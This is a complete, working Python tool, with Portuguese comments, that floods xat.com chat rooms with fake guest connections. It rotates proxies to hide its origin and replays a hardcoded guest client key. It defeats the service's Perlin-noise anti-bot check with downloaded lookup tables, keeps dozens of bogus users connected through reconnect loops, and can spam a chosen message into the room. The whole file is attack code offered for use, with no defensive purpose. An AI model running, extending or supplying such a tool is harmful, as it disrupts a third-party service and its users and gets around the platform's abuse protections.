#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# language: Python 3.10+ | target: Ubuntu Linux VPS | runtime: asyncio
# xat.com lotador de sala (connection flooder) via protocolo XMLSocket (guest).
# Nao executa nada alem de abrir sockets TCP; rode na VPS, nao na maquina local.

from __future__ import annotations

import argparse
import asyncio
import json
import random
import re
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

import aiohttp
from aiohttp_socks import ProxyConnector
from python_socks.async_.asyncio import Proxy
from rich import box
from rich.console import Console, Group
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

# --------------------------------------------------------------------------- #
# constantes
# --------------------------------------------------------------------------- #
IP2_URL = "https://xat.com/web_gear/chat/ip2.php"
ROOMID_URLS = [
    "https://xat.com/web_gear/chat/roomid.php?d={name}",
    "https://xat.com/api/roomid.php?d={name}",
]

PERLIN_URLS = {
    "100_100_5_100": "https://raw.githubusercontent.com/TwiN/PythonXatBot/master/100_100_5_100.txt",
    "100_100_5_101": "https://raw.githubusercontent.com/TwiN/PythonXatBot/master/100_100_5_101.txt",
}

# k1 de convidado (unregistered). Fixo no cliente xat; troque com --k1 se o
# servidor responder <v e="60"/> ou <logout e="E07"/>.
GUEST_K1 = "5cfeb32e41588e383d00"

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")

BROWSER_HEADERS = {
    "User-Agent": UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "https://xat.com/",
    "Upgrade-Insecure-Requests": "1",
}

LOGOUT_CODES = {
    "E03": "j2/y invalido - room ou userno ausente",
    "E07": "k1 ausente/incorreta - atualize --k1",
    "E12": "modo 'nao logar automaticamente'",
    "E25": "l5/k3 incorreto - falha no perlin noise",
    "E36": "protect ativado (sala protegida por senha)",
    "E37": "protect ativado",
    "E38": "protect ativado",
}

NAME_POOL = [
    "carlos", "pedro", "lucas", "gabriel", "rafael", "bruno", "felipe", "diego",
    "mariana", "julia", "beatriz", "larissa", "camila", "amanda", "ana", "luan",
    "vinicius", "gustavo", "fernando", "andre", "tiago", "ricardo", "marcos",
    "jorge", "sandro", "wagner", "leandro", "henrique", "otavio", "cesar",
]

# --------------------------------------------------------------------------- #
# parsing de pacotes xat (XML bagunçado -> regex robusto)
# --------------------------------------------------------------------------- #
_ATTR_RE = re.compile(r'(\w+)="([^"]*)"')
_TAG_RE = re.compile(r"<(\w+)\b")
_ENT = {"&quot;": '"', "&amp;": "&", "&lt;": "<", "&gt;": ">", "&apos;": "'"}


def _unescape(s: str) -> str:
    for k, v in _ENT.items():
        s = s.replace(k, v)
    return s


def _escape(s: str) -> str:
    return (s.replace("&", "&amp;").replace('"', "&quot;")
             .replace("<", "&lt;").replace(">", "&gt;")
             .replace("'", "&apos;"))


def parse_packet(raw: bytes) -> tuple[str, dict]:
    """Transforma um pacote XMLSocket em (tag, dict_de_atributos)."""
    text = raw.decode("utf-8", "replace")
    text = re.sub(r'("[^"]*")([^\s/>])', r"\1 \2", text)  # <y a="1"b="2"/> fix
    m = _TAG_RE.search(text)
    if not m:
        return "", {}
    tag = m.group(1)
    attrs = {k: _unescape(v) for k, v in _ATTR_RE.findall(text)}
    return tag, attrs


def build_packet(tag: str, attrs: dict, order: Optional[list] = None) -> bytes:
    keys = order or list(attrs.keys())
    parts = [f'<{tag}'] + [
        f'{k}="{_escape(str(attrs[k]))}"' for k in keys if k in attrs
    ] + ["/>"]
    return (" ".join(parts) + "\x00").encode("utf-8")


# --------------------------------------------------------------------------- #
# config
# --------------------------------------------------------------------------- #
@dataclass
class Config:
    room: str                      # nome ou id numerico
    roomid: int = 0
    count: int = 50
    proxy: list = field(default_factory=list)   # urls completas scheme://user:pass@host:port
    proxy_type: str = "socks5"
    k1: str = GUEST_K1
    names: list = field(default_factory=list)
    avatar: int = -1               # -1 = aleatorio por conexao
    keepalive: float = 120.0
    connect_delay: float = 0.15
    handshake_timeout: float = 15.0
    socket_timeout: float = 60.0
    reconnect_backoff: float = 2.0
    spam: Optional[str] = None
    spam_interval: float = 15.0
    perlin_dir: Path = Path.home() / ".cache" / "xat_flood"
    verbose: bool = False
    no_proxy: bool = False


def normalize_proxy(raw: str, ptype: str) -> str:
    if "://" in raw:
        return raw
    return f"{ptype}://{raw}"


# --------------------------------------------------------------------------- #
# resolvers (HTTP via proxy)
# --------------------------------------------------------------------------- #
class Web:
    def __init__(self, proxy_urls: list, no_proxy: bool):
        self._proxy_urls = proxy_urls
        self._no_proxy = no_proxy
        self._proxied: Optional[aiohttp.ClientSession] = None
        self._direct: Optional[aiohttp.ClientSession] = None

    async def start(self):
        self._direct = aiohttp.ClientSession()
        if self._no_proxy or not self._proxy_urls:
            self._proxied = self._direct
        else:
            self._proxied = aiohttp.ClientSession(
                connector=ProxyConnector.from_url(self._proxy_urls[0]))

    async def close(self):
        if self._proxied and self._proxied is not self._direct:
            await self._proxied.close()
        if self._direct:
            await self._direct.close()

    async def _fetch_text(self, url: str) -> str:
        sessions = [self._proxied] if self._proxied else []
        if self._direct and self._direct is not self._proxied:
            sessions.append(self._direct)
        last: Optional[Exception] = None
        for s in sessions:
            try:
                async with s.get(url, headers=BROWSER_HEADERS, timeout=25) as r:
                    r.raise_for_status()
                    return await r.text()
            except Exception as e:  # fallback direto
                last = e
        raise last if last else RuntimeError("sem sessao http")

    async def get_json(self, url: str) -> dict:
        return json.loads(await self._fetch_text(url))

    async def get_text(self, url: str) -> str:
        return await self._fetch_text(url)


async def resolve_roomid(web: Web, room: str) -> int:
    if room.isdigit():
        return int(room)
    from urllib.parse import quote
    name = quote(room)
    last: Optional[Exception] = None
    for url in ROOMID_URLS:
        try:
            data = await web.get_json(url.format(name=name))
            rid = data.get("id")
            if rid:
                return int(rid)
        except Exception as e:
            last = e
    raise SystemExit(f"[erro] sala '{room}' nao encontrada (ultimo erro: {last})")


# --------------------------------------------------------------------------- #
# ip2.php -> escolha de servidor (mesma logica do cliente oficial)
# --------------------------------------------------------------------------- #
def _get_dom(roomid: int, xflag: int) -> int:
    if xflag & 8:
        return random.randint(0, 3)
    if roomid == 8:
        return 0
    if roomid < 8:
        return 3
    return (roomid & 96) >> 5


def _get_port(roomid: int, xflag: int) -> int:
    if xflag & 8:
        return 10007 + random.randint(0, 31)
    if roomid == 8:
        return 10000
    if roomid < 8:
        return 9999 + roomid
    return 10007 + (roomid % 32)


def pick_server(rules: dict, roomid: int, attempt: int) -> tuple[str, int]:
    order = rules["order"]
    xflag = int(rules.get("xFlag", 0))
    pool_name, _weight = order[attempt % len(order)]
    pool = rules[pool_name]                     # [flag, [hosts...]]
    if pool[0] & 1:
        idx = random.randint(1, max(1, len(pool) - 1))
        host_ent = random.choice(pool[idx])
        parts = host_ent.split(":")
        host = parts[0]
        port = int(parts[1]) if len(parts) > 1 and parts[1] else 10000
        flag = int(parts[2]) if len(parts) > 2 and parts[2] else 39
        port += random.randint(0, flag - 1)
    else:
        dom = _get_dom(roomid, xflag)
        port = _get_port(roomid, xflag)
        host = pool[1][(4 * dom) + random.randint(0, 3)]
    return host, port


# --------------------------------------------------------------------------- #
# perlin noise (l5)
# --------------------------------------------------------------------------- #
class Perlin:
    def __init__(self, cache_dir: Path, web: Web):
        self._dir = cache_dir
        self._web = web
        self._tables: dict = {}

    async def _load(self, p: str) -> Optional[dict]:
        if p in self._tables:
            return self._tables[p]
        cache = self._dir / f"{p}.txt"
        if not cache.exists() and p in PERLIN_URLS:
            try:
                data = await self._web.get_text(PERLIN_URLS[p])
                self._dir.mkdir(parents=True, exist_ok=True)
                cache.write_text(data)
            except Exception:
                return None
        if not cache.exists():
            return None
        table = {}
        for line in cache.read_text().splitlines():
            if ":" in line:
                xy, val = line.split(":", 1)
                table[xy.strip()] = val.strip()
        self._tables[p] = table
        return table

    async def l5(self, p: str, yi: int) -> str:
        parts = p.split("_")
        if len(parts) < 4:
            return "0"
        w, h = int(parts[0]), int(parts[1])
        t = yi % (w * h)
        px, py = t % w, t // w
        table = await self._load(p)
        if table is None:
            return "0"
        return table.get(f"{px},{py}", "0")


# --------------------------------------------------------------------------- #
# pool de proxies (round-robin)
# --------------------------------------------------------------------------- #
class ProxyPool:
    def __init__(self, urls: list):
        self._urls = urls
        self._i = 0
        self._n = len(urls)

    def acquire(self) -> Optional[str]:
        if self._n == 0:
            return None
        url = self._urls[self._i % self._n]
        self._i += 1
        return url


# --------------------------------------------------------------------------- #
# uma conexao guest
# --------------------------------------------------------------------------- #
class ConnError(Exception):
    pass


class Conn:
    def __init__(self, idx: int, cfg: Config, rules: dict,
                 perlin: Perlin, proxies: ProxyPool):
        self.idx = idx
        self.cfg = cfg
        self.rules = rules
        self.perlin = perlin
        self.proxies = proxies

        self.userno = random.randint(10**8, 10**10 - 1)
        self.name = self._pick_name()
        self.avatar = random.randint(0, 1758) if cfg.avatar < 0 else cfg.avatar

        self.state = "AGUARDANDO"
        self.proxy_label = "-"
        self.joined_at: Optional[float] = None
        self.keepalives = 0
        self.msgs = 0
        self.reconnects = 0
        self.last_error = ""
        self.attempt = 0

        self._reader: Optional[asyncio.StreamReader] = None
        self._writer: Optional[asyncio.StreamWriter] = None
        self._buf = b""

    def _pick_name(self) -> str:
        if self.cfg.names:
            return self.cfg.names[self.idx % len(self.cfg.names)]
        base = random.choice(NAME_POOL)
        return f"{base}_{random.randint(1000, 9999)}"

    # -- io ---------------------------------------------------------------- #
    async def _send(self, tag: str, attrs: dict, order: Optional[list] = None):
        self._writer.write(build_packet(tag, attrs, order))
        await self._writer.drain()

    async def _send_raw(self, data: str):
        self._writer.write(data.encode("utf-8") + b"\x00")
        await self._writer.drain()

    async def _read_packet(self, timeout: Optional[float] = None) -> tuple[str, dict]:
        limit = timeout or self.cfg.socket_timeout
        deadline = time.monotonic() + limit
        while b"\x00" not in self._buf:
            remain = deadline - time.monotonic()
            if remain <= 0:
                raise asyncio.TimeoutError()
            chunk = await asyncio.wait_for(self._reader.read(4096), timeout=remain)
            if not chunk:
                raise ConnError("socket fechado pelo servidor")
            self._buf += chunk
        raw, self._buf = self._buf.split(b"\x00", 1)
        if not raw.strip():
            return await self._read_packet(timeout)
        return parse_packet(raw)

    async def _connect(self, host: str, port: int):
        url = self.proxies.acquire()
        self.proxy_label = url or "direto"
        if url and not self.cfg.no_proxy:
            proxy = Proxy.from_url(url)
            sock = await proxy.connect(dest_host=host, dest_port=port,
                                       timeout=self.cfg.handshake_timeout)
            self._reader, self._writer = await asyncio.open_connection(sock=sock)
        else:
            self._reader, self._writer = await asyncio.open_connection(host, port)

    # -- handshake --------------------------------------------------------- #
    async def _handshake(self):
        host, port = pick_server(self.rules, self.cfg.roomid, self.attempt)
        self.state = "CONECTANDO"
        await self._connect(host, port)
        self.attempt += 1

        t_start = time.monotonic()
        self.state = "HANDSHAKE"
        await self._send("y", {"r": str(self.cfg.roomid), "v": "0",
                               "u": str(self.userno)},
                         order=["r", "v", "u"])

        # espera o <y> do servidor (i, c, p = perlin, C="1" = captcha)
        while True:
            tag, attrs = await self._read_packet(self.cfg.handshake_timeout)
            if tag == "y":
                break
            if tag == "logout":
                raise ConnError(f"logout {attrs.get('e','')} "
                                f"({LOGOUT_CODES.get(attrs.get('e',''), '?' )})")
            if tag == "v" and attrs.get("e") == "60":
                raise ConnError("k1 recusada (<v e=60>) - atualize --k1")

        if attrs.get("C") == "1":
            raise ConnError("captcha exigido - conexao abandonada")

        yi = attrs.get("i", "0")
        l5 = "0"
        if attrs.get("p"):
            l5 = await self.perlin.l5(attrs["p"], int(yi))
        jt2 = int((time.monotonic() - t_start) * 1000)

        j2_attrs = {
            "cb": "0", "Y": "2", "l5": l5,
            "l4": str(int((time.monotonic() - t_start) * 1000)),
            "l3": str(jt2), "l2": "0",
            "y": yi, "k": self.cfg.k1, "k3": "0", "p": "0",
            "c": str(self.cfg.roomid), "f": "0", "u": str(self.userno),
            "d0": "0", "n": self.name, "a": str(self.avatar), "h": "", "v": "0",
        }
        j2_order = ["cb", "Y", "l5", "l4", "l3", "l2", "y", "k", "k3", "p",
                    "c", "f", "u", "d0", "n", "a", "h", "v"]
        await self._send("j2", j2_attrs, order=j2_order)

        # espera <done/> (ou logout/dup)
        while True:
            tag, attrs = await self._read_packet(self.cfg.handshake_timeout)
            if tag == "done":
                return
            if tag == "logout":
                raise ConnError(f"logout {attrs.get('e','')} "
                                f"({LOGOUT_CODES.get(attrs.get('e',''), '?' )})")
            if tag == "dup":
                raise ConnError("dup - userno duplicado")
            if tag == "v" and attrs.get("e") == "60":
                raise ConnError("k1 recusada (<v e=60>)")

    # -- pos-join ---------------------------------------------------------- #
    async def _hold(self):
        self.state = "ONLINE"
        self.joined_at = time.time()
        keep = asyncio.create_task(self._keepalive_loop())
        spam = None
        if self.cfg.spam:
            spam = asyncio.create_task(self._spam_loop())
        try:
            await self._send_raw("<w0 />")  # pool principal
            while True:
                try:
                    tag, attrs = await self._read_packet(self.cfg.socket_timeout)
                except asyncio.TimeoutError:
                    continue  # silencio do servidor e normal
                if tag == "logout":
                    raise ConnError(f"logout {attrs.get('e','')}")
                if tag == "dup":
                    raise ConnError("dup - userno duplicado")
                if tag == "m":
                    self.msgs += 1
        finally:
            keep.cancel()
            if spam:
                spam.cancel()
            self._close()

    async def _keepalive_loop(self):
        try:
            while True:
                await asyncio.sleep(self.cfg.keepalive)
                await self._send("c", {"u": "1", "t": "/KEEPALIVE"},
                                 order=["u", "t"])
                self.keepalives += 1
        except asyncio.CancelledError:
            pass
        except Exception:
            pass

    async def _spam_loop(self):
        try:
            while True:
                await asyncio.sleep(self.cfg.spam_interval)
                await self._send("m", {"u": str(self.userno),
                                       "t": self.cfg.spam}, order=["u", "t"])
                self.msgs += 1
        except asyncio.CancelledError:
            pass
        except Exception:
            pass

    def _close(self):
        if self._writer:
            try:
                self._writer.close()
            except Exception:
                pass
        self._reader = None
        self._writer = None
        self._buf = b""
        self.joined_at = None

    # -- ciclo de vida ----------------------------------------------------- #
    async def run(self, stop: asyncio.Event):
        while not stop.is_set():
            try:
                await self._handshake()
                await self._hold()
            except (asyncio.TimeoutError, ConnError, OSError,
                    aiohttp.ClientError) as e:
                self.last_error = str(e)[:60]
                self.state = "RECONECTANDO"
            except Exception as e:
                self.last_error = f"{type(e).__name__}: {str(e)[:50]}"
                self.state = "RECONECTANDO"
            finally:
                self._close()
            if stop.is_set():
                break
            self.reconnects += 1
            await asyncio.sleep(self.cfg.reconnect_backoff +
                                random.uniform(0, self.cfg.reconnect_backoff))


# --------------------------------------------------------------------------- #
# dashboard rich
# --------------------------------------------------------------------------- #
STATUS_STYLE = {
    "AGUARDANDO": "dim",
    "CONECTANDO": "yellow",
    "HANDSHAKE": "yellow",
    "ONLINE": "green",
    "RECONECTANDO": "red",
    "FALHA": "red",
}


def render_dashboard(cfg: Config, conns: list, start: float) -> Group:
    alive = sum(1 for c in conns if c.state == "ONLINE")
    reconn = sum(c.reconnects for c in conns)
    ka = sum(c.keepalives for c in conns)
    msgs = sum(c.msgs for c in conns)
    uptime = int(time.time() - start)

    header = Text()
    header.append("XAT FLOOD", style="bold white on dark_red")
    header.append(f"  sala={cfg.room} id={cfg.roomid}  ", style="bold cyan")
    header.append(f"alvo={cfg.count}", style="bold white")
    header.append(f"  online={alive}", style="bold green")
    header.append(f"  reconexoes={reconn}", style="bold yellow")
    header.append(f"  keepalives={ka}  msgs={msgs}", style="dim")
    header.append(f"  uptime={uptime}s", style="dim")

    table = Table(box=box.SIMPLE, expand=True, pad_edge=False)
    table.add_column("#", justify="right", style="dim", width=4)
    table.add_column("status", width=13)
    table.add_column("proxy", width=34)
    table.add_column("userno", width=11)
    table.add_column("nome", width=18)
    table.add_column("ka", justify="right", width=5)
    table.add_column("msg", justify="right", width=5)
    table.add_column("erro", overflow="fold")

    for c in conns:
        style = STATUS_STYLE.get(c.state, "white")
        uptime_c = ""
        if c.joined_at:
            uptime_c = f"{int(time.time() - c.joined_at)}s"
        table.add_row(
            str(c.idx),
            f"[{style}]{c.state}[/]",
            c.proxy_label,
            str(c.userno),
            c.name + (" " + uptime_c if uptime_c else ""),
            str(c.keepalives),
            str(c.msgs),
            c.last_error,
        )
    return Group(Panel(header, box=box.SQUARE), table)


# --------------------------------------------------------------------------- #
# main
# --------------------------------------------------------------------------- #
def parse_args(argv) -> Config:
    ap = argparse.ArgumentParser(
        prog="xat_flood", description="Lotador de sala xat.com (conexoes guest)")
    ap.add_argument("--room", required=True,
                    help="nome da sala (ex: Help) ou id numerico")
    ap.add_argument("--count", type=int, default=50, help="numero de conexoes (default 50)")
    ap.add_argument("--proxy", action="append", default=[],
                    help="proxy user:pass@host:port (repita p/ varios)")
    ap.add_argument("--proxy-type", default="socks5", choices=["socks5", "socks4", "http"])
    ap.add_argument("--no-proxy", action="store_true", help="conecta direto (sem proxy)")
    ap.add_argument("--k1", default=GUEST_K1, help="k1 de convidado (override)")
    ap.add_argument("--names", help="nomes separados por virgula (cicla)")
    ap.add_argument("--avatar", type=int, default=-1, help="avatar fixo (0-1758)")
    ap.add_argument("--keepalive", type=float, default=120.0)
    ap.add_argument("--connect-delay", type=float, default=0.15)
    ap.add_argument("--spam", help="mensagem opcional para spammar no chat")
    ap.add_argument("--spam-interval", type=float, default=15.0)
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args(argv)

    cfg = Config(
        room=args.room, count=args.count,
        proxy=[normalize_proxy(p, args.proxy_type) for p in args.proxy],
        proxy_type=args.proxy_type, k1=args.k1,
        names=args.names.split(",") if args.names else [],
        avatar=args.avatar, keepalive=args.keepalive,
        connect_delay=args.connect_delay, spam=args.spam,
        spam_interval=args.spam_interval, verbose=args.verbose,
        no_proxy=args.no_proxy,
    )
    return cfg


async def amain(cfg: Config, console: Console):
    web = Web(cfg.proxy, cfg.no_proxy)
    await web.start()
    try:
        cfg.roomid = await resolve_roomid(web, cfg.room)
        rules = await web.get_json(IP2_URL)
        console.print(f"[cyan]ip2.php[/] ordem={rules['order']} xFlag={rules.get('xFlag')}")
        console.print(f"[cyan]sala[/] {cfg.room} -> id {cfg.roomid}")
    except Exception as e:
        console.print(f"[red]falha ao resolver[/] {e}")
        await web.close()
        raise SystemExit(1)

    perlin = Perlin(cfg.perlin_dir, web)
    proxies = ProxyPool(cfg.proxy)
    conns = [Conn(i, cfg, rules, perlin, proxies)
             for i in range(1, cfg.count + 1)]

    stop = asyncio.Event()
    tasks = []

    async def spawner():
        for c in conns:
            if stop.is_set():
                return
            tasks.append(asyncio.create_task(c.run(stop)))
            await asyncio.sleep(cfg.connect_delay)

    start = time.time()
    spawn = asyncio.create_task(spawner())

    console.print(Panel("[bold]xat_flood[/] - pressione Ctrl+C para encerrar",
                        box=box.SQUARE))

    with Live(render_dashboard(cfg, conns, start), console=console,
              refresh_per_second=4, screen=False) as live:
        try:
            await spawn
            while not stop.is_set():
                live.update(render_dashboard(cfg, conns, start))
                await asyncio.sleep(0.5)
        except KeyboardInterrupt:
            pass
        finally:
            stop.set()

    spawn.cancel()
    for t in tasks:
        t.cancel()
    await asyncio.gather(spawn, *tasks, return_exceptions=True)
    await web.close()

    console.print(Panel(
        "[bold green]encerrado.[/] "
        f"conexoes criadas={cfg.count} "
        f"online_final={sum(1 for c in conns if c.state=='ONLINE')} "
        f"reconexoes={sum(c.reconnects for c in conns)}",
        box=box.SQUARE))


def main():
    cfg = parse_args(sys.argv[1:])
    console = Console()
    try:
        asyncio.run(amain(cfg, console))
    except KeyboardInterrupt:
        pass
    except SystemExit:
        raise
    except Exception as e:
        console.print(f"[red]erro fatal:[/] {e}")
        raise


if __name__ == "__main__":
    main()
